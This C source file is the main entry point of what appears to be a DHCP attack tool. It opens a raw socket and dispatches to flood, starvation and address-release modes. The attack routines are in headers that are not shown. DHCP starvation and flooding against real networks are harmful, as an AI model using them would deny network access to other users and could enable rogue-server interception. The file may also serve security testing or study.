#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "settings/headers/program_data.h"
#include "settings/headers/set_settings.h"
#include "interface_socket/headers/interface.h"
#include "interface_socket/headers/socket.h"
#include "attacks/attacks.h"

#define BUF_SIZE 256

int main(int argc, char **argv)
{
	struct user_opt *uopt;	  // user options
	struct if_data *ifd;      // interface data
	unsigned char err[256];   // memory for saving of errors
	int sock;				  // socket
	u_char *inface;           // interface

	/* Options parsing */
	if((uopt = OptParser(argv, argc, err)) == NULL){

		printf("%s\n", err);

		exit(EXIT_FAILURE);
	}

	/* If interface isn't set, then find first active */
	if(uopt->if_name[0] == 0)
	{
		if((inface = InitInterface()) == NULL)
		{
			printf("No active interface\n");

			exit(EXIT_FAILURE);
		}

		strncpy(uopt->if_name, inface, strlen(inface));
	}

	/* Interface options */
	if((ifd = GetIfData(uopt->if_name, err)) == NULL){

		printf("%s(%s)\n", err, uopt->if_name);

		exit(EXIT_FAILURE);
	}

	/* Creaton of a raw socket */
	if((sock = CreateRawSock(ifd, ETH_P_IP, err)) < 0){
	
		printf("%s(%s)\n", err, uopt->if_name);

		exit(EXIT_FAILURE);
	}

	/* Flood mode on: */
	if(!strcmp("flood", uopt->mode))
	{
		/* Initialisation of user settings:
	       if user ip or mac aren't set, then will be
	       used addresses of your device from structure if_data*/
		InitSettings(uopt, *(u_int *)ifd->if_ip, ifd->if_mac);

		DHCPFlood(sock, uopt);
	}

	/* Starvation mode: */
	else if(!strcmp("starvation", uopt->mode))
	{
		InitSettings(uopt, *(u_int *)ifd->if_ip, ifd->if_mac);
		
		DHCPStarvation(sock, uopt);
	}

	/* Free mode */
	else if(!strcmp("free", uopt->mode))
	{
		int result;

		if((result = FreeAddrs(sock)) != -1)
			printf("All of %d addresses are free\n", result);

		else
			printf("No file \"%s\"\n", PATH_TO_FILE);
	}

	printf("Exit...\n");

	close(sock);

	exit(EXIT_SUCCESS);	
}